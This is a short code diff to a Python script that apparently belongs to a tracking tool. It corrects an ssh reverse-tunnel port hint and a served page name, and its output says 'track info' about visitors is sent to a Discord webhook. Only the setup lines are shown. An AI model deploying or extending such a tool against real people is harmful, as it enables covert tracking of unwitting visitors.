@@ -53,9 +53,9 @@ file1.close()
 print(f'\nTo port forward install ngrok or use ssh')
 
 print(f'{C}For ngrok port forward type: {Y}ngrok http 8000')
-print(f'{C}For ssh port forwarding type: {Y}ssh -R 80:localhost:8080 ssh.localhost.run\n')
+print(f'{C}For ssh port forwarding type: {Y}ssh -R 80:localhost:8000 ssh.localhost.run\n')
 
-print(f'{Y}Localhost Link: {W}http://localhost:8000/r4ven.html')
+print(f'{Y}Localhost Link: {W}http://localhost:8000/index.html')
 print(f'{C}track info will be sent to your discord webhook.\n')
 
 os.system("python3 -m http.server")
